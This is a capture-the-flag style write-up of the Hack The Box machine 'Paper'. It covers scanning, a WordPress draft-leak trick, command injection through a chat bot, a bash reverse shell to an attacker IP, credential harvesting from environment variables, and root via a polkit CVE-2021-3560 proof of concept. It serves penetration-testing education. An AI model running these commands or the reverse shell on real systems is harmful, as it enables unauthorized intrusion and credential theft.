---
tags:
  - post
  - hackTheBoxPost
title: Paper
layout: post.njk
description: >
  A short description of the article
eleventyNavigation:
  key: Post
  title: Paper
  parent: HackTheBoxPosts
---
# Introduction
This is a relativly easy box, it has everything you would need to get started. There isn't any manual exploits, it's just a matter of choosing the right tools for the job. 
I do reccomend this box for beginners.

# Enumeration
So as always, we start out with a NMAP scan to discover what we are working with.
```
┌──(kali㉿kali)-[~/Documents/htb/paper]
└─$ nmap -sC -sV 10.10.11.143        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 06:22 EST
Nmap scan report for 10.10.11.143
Host is up (0.094s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| tls-alpn: 
|_  http/1.1
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.28 seconds
```
It seems like we have a webserver at port 80 and 443. So while checking this out in firefox, we will also start a dirb scan to have some further enumeration in the background.


![HTTP Server](https://i.imgur.com/ULrn1m0.jpg?1)


```
┌──(kali㉿kali)-[~/Documents/htb/paper]
└─$ dirb http://10.10.11.143 
-----------------             
DIRB v2.22                   
By The Dark Raver             
-----------------            
START_TIME: Mon Feb 14 03:30:39 2022            
URL_BASE: http://10.10.11.143/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt            
-----------------        
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.11.143/ ----
+ http://10.10.11.143/cgi-bin/ (CODE:403|SIZE:199)                             
==> DIRECTORY: http://10.10.11.143/manual/
```
Dirb didn't seem to find anything useful, also the webpage was a standard apache site. Not much to get from here. Therefore we will try a different tool to check what it can find.
Nikto is a server scanner, it will check for outdated software, test paths, and do a light scan to see if it can detect anything out of the ordinary.
```bash
┌──(kali㉿kali)-[~/Documents/htb/paper]
└─$ nikto -host http://10.10.11.143
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.143
+ Target Hostname:    10.10.11.143
+ Target Port:        80
+ Start Time:         2022-02-14 07:33:00 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8698 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-02-14 07:47:53 (GMT-5) (893 seconds)
---------------------------------------------------------------------------
```
Here you see that we actually find something. 
Uncommon header `'x-backend-server' found, with contents: office.paper`
I have no idea what office.paper is. But it seems like the webserver is doing some sort of virtual routing. The way this is possible is that the server is pointing requests in different places based on what request it recives. Therefore by adding that to /etc/hosts, we are telling our attacking computer that every call to the chosen domain, is still directed to the ip address, but it forms the request differently. For more information, check out wikipedia: https://en.wikipedia.org/wiki/Virtual_hosting
## Blunder Tiffin
So lets add this to /etc/hosts, then we will be able to see the contents of that page. 
```bash
┌──(kali㉿kali)-[~/Documents/htb/paper]
└─$ sudo vim /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.143    office.paper
```
![WordpressPage](https://i.imgur.com/xFk3AaV.png)
Success, we get a wordpress page. 

## Wordpress exploits
Now lets inspect the contents.
At the bottom we see that this is wordpress version 5.2.3
```html
...
</div> 

<script type='text/javascript' src='http://office.paper/wp-content/themes/techup/assets/js/owl.carousel.js?ver=5.2.3'></script>
<script type='text/javascript' src='http://office.paper/wp-content/themes/techup/assets/js/jquery.magnific-popup.js?ver=5.2.3'></script>
<script type='text/javascript' src='http://office.paper/wp-content/themes/techup/assets/js/custom.js?ver=5.2.3'></script>
<script type='text/javascript' src='http://office.paper/wp-content/themes/techup/assets/js/navigation.js?ver=5.2.3'></script>
<script type='text/javascript' src='http://office.paper/wp-includes/js/wp-embed.min.js?ver=5.2.3'></script>

</body>
</html>
```

Lets do a quick searchsploit for this
```
┌──(kali㉿kali)-[~/Documents/htb/paper]
└─$ searchsploit wordpress 5.2.3
-------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title  Path
-------------------------------------------------------------------------------------------------------------------------------------------------
WordPress Core 5.2.3 - Cross-Site Host Modification                                                | php/webapps/47361.pl
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                            | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                            | php/dos/47800.py
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                          | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                        | php/webapps/48918.sh
--------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results
```
XXS is probably not the right way to go, and DDOSing isn't really our goal, and the others doesn't seem to fit. Therefore we are left with 47690. Lets check it out:
```bash
┌──(kali㉿kali)-[~/Documents/htb/paper]
└─$ searchsploit -x 47690

So far we know that adding `?static=1` to a wordpress URL should leak its secret content
Here are a few ways to manipulate the returned entries:
- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format
In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
```
So just by appending ?static=1 to the end of the url, we get to see all of the content. `http://office.paper/?static=1`
![offfice paper static](https://i.imgur.com/vd6Huan.png)



If we were to read some of the posts we would see the hint of unsecure drafts. But we got a new link `http://chat.office.paper/register/8qozr226AhkCHZdyY`
. This points us to chat.office.paper. So lets again, add that to /etc/hosts and see what we get.
```bash
┌──(kali㉿kali)-[~/Documents/htb/paper]
└─$ sudo vim /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.143    office.paper    chat.office.paper
```
![chat register](https://i.imgur.com/5pSGxas.png)

We get a register user and login page!

# Chat

So lets just register a user and check whats there. It started as an empty page, but thats just becuase we havn't joined a chatroom yet.
![general chatroom](https://i.imgur.com/oVrPTEw.png)

Upon looking around in the general room it looks like Dwight has added a bot to answer any questions that anyone has. The general chatroom is a read only, so therefore lets just chat directly with the bot Recyclops

```
Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
Most frequently asked questions include:
- What time is it?
- What new files are in your sale directory?
- Why did the salesman crossed the road?
- What's the content of file x in your sales directory? etc.
Please note that I am a beta version and I still have some bugs to be fixed.
How to use me ? :
1. Small Talk:
You can ask me how dwight's weekend was, or did he watched the game last night etc.
eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
2. Joke:
You can ask me Why the salesman crossed the road.
eg: 'recyclops why did the salesman crossed the road?'
<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
For security reasons, the access is limited to the Sales folder.
3. Files:
eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file sale/secret.xls' or just 'recyclops file test.txt'
4. List:
You can ask me to list the files
eg: 'recyclops i need directory list sale' or just 'recyclops list sale'
5. Time:
You can ask me what the time is
eg: 'recyclops what time is it?' or just 'recyclops time'
That's what I am capable of doing right now.
Also, Dwight is a cool guy and not a Time Thief!
```
Hilarious, so it seems like you can ask him something and he will fetch files, tell jokes and list directories.
When I see something like this i want to see what a legitimate call looks like and what a illigitimate one looks like.
So if we ask him `list sale` he replys with:
```bash
 Fetching the directory listing of /sales/
total 0
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 11 dwight dwight 281 Feb 6 07:51 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
```
But if we ask for something like `list sale; whoami`, then he simply replys with `STOP INJECTING OS COMMANDS`.
Another function he adds is `file reports.txt`, then he cats the file.
So we have two functions that each do `ls -la` and `cat`. 
If you use the list function, it doesn't sanitize our input to remove things like `../`, so we can directory traverse the filesystem to poke around.
...
Why not try run?
`run whoami` -> `Dwight`
We have code execution!
# Shell
I set up my NC listener `nc -nvlp 8080`
`run bash -i >& /dev/tcp/10.10.10.10/8080 0>&1`, we get shell!
I do reccommend taking a look at https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet . He has gathered everything you need.

So lets take a look at what we have, i run the env command to check out whats currently going on.

```bash
┌──(kali㉿kali)-[~/Documents/htb/paper]    
└─$ nc -nvlp 8080                                                                                         
listening on [any] 8080 ...                                                                               
connect to [10.10.10.10] from (UNKNOWN) [10.10.11.143] 46252

[recyclops@paper]$ env                      
RESPOND_TO_EDITED=true   
ROCKETCHAT_USER=recyclops            
_=/usr/bin/env                       
LANG=en_US.UTF-8                     
OLDPWD=/home/dwight/hubot            
ROCKETCHAT_URL=http://127.0.0.1:48320
ROCKETCHAT_USESSL=false      
XDG_SESSION_ID=1             
USER=dwight                  
NCAT_REMOTE_ADDR=10.10.14.231
RESPOND_TO_DM=true    
PWD=/home/dwight/hubot
HOME=/home/dwight                   
NCAT_REMOTE_PORT=8080               
PORT=8000                           
NCAT_LOCAL_PORT=46252               
ROCKETCHAT_PASSWORD=Queenofblad3s!23
SHELL=/bin/sh                                                                                             
SHLVL=5                                                                                                   
BIND_ADDRESS=127.0.0.1     
LOGNAME=dwight                
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus       
XDG_RUNTIME_DIR=/run/user/1004                              
PATH=/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin
NCAT_LOCAL_ADDR=10.10.11.143
NCAT_PROTO=TCP
---
```
As expected, i am the rocketchat user recyclops, listening at port 8000, and using a password Queenofblad3s!23. But mylogon name is dwight.
So this might mean that we can log on dwights user using this password!
Whenever we have the chance, switch from nc to ssh, becuase our shell is much more stable and we have tabcompleation and ctrl+c access.

## Upgrading our shell
We try to ssh with the password we just found and we gain access!
`ssh dwight@10.10.11.143 -p Queenofblad3s!23`
When trying this box, i saw that the /home/dwight/hubot folder was beginning to be cluttered with a lot of file and such by other users. So i navigate to /dev/shm to create my own space to work from. Not only is this a filespace that is rarely used by others, it also is non persistant. So we can add stuff there that will not cause trouble for others.
More info can be found here: https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html

# Enumeration
As a rule of thumb, i try to manually enumerate some things first:
```bash
ls -la /etc/passwd
cat /etc/passwd
sudo -l
find / -perm -u=s -type f 2>/dev/null
ss -antlp
ls -lah /etc/cron*
++++
```
So manual enumeration is great, we have a lot of control over what we are looking at and for, but can be hard to master. So I reccomend using either ![LinEnum](https://github.com/rebootuser/LinEnum) or ![LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
I tried out linpeas becuase it is relativly new and seems to be the hottest thing on the market right now.
I used `python3 -m http.server` to host a local http server at my attacking client, and wget on the box to retrive the files i needed. This is usually a good way to transfer files as it goesthrough http ports, something that often isn't blocked by the firewall.

![PeasInAction](https://i.imgur.com/VoxcMrX.png)
The results from linpeas is massive, but one thing stood out.
```
╔══════════╣ Sudo version                             
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version 
Sudo version 1.8.29                      
Vulnerable to CVE-2021-3560
```
The sudo version is vulnerable.

# Privesc
As it turns out it's vulnerable to the CVE-2021-3560 which is a vulneralbility that allows the attacker to create a new admin. A brief summary is written ![here](https://access.redhat.com/security/cve/cve-2021-3560). But as a treat, the creator of the box has created a privesc POC that we can use. This definetly is the right way

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh
The flow of the code is shown under, i won't comment too much on it as it explains well what its doing. The only problem i had was using the correct password. Therefore i added the -p flag to declare my own password. Bear in mind, the code says that you might need to run this exploit a couple of times, so don't worry.
```bash
[dwight@paper shm]$ ./esc.sh -p=test123  
[!] Username set as : secnigma           
[!] No Custom Timing specified.           
[!] Timing will be detected Automatically  
[!] Force flag not set.                
[!] Vulnerability checking is ENABLED!   
[!] Starting Vulnerability Checks...       
[!] Checking distribution...                                     
[!] Detected Linux distribution as "centos"                           
[!] Checking if Accountsservice and Gnome-Control-Center is installed 
[+] Accounts service and Gnome-Control-Center Installation Found!!  
[!] Checking if polkit version is vulnerable                 
[+] Polkit version appears to be vulnerable!!                  
[!] Starting exploit...                                       
[!] Inserting Username secnigma...                                         
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required       
[+] Inserted Username secnigma  with UID 1005!               
[!] Inserting password hash...                            
[!] It looks like the password insertion was succesful!          
[!] Try to login as the injected user using su - secnigma              
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper shm]$ su - secnigma
Password: 
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma:
[root@paper secnigma]# whoami
root
```
We are root.

# Final thoughts
I hope you learned something. A classic thing in this box was thinking outside of the box. Virtual hosting can be hard to think about in the start, but it definetly is useful to hide pages or reroute traffic. And trying out linpeas was fun as it is a verry powerful and structured tool. I will definetly use this in the future.
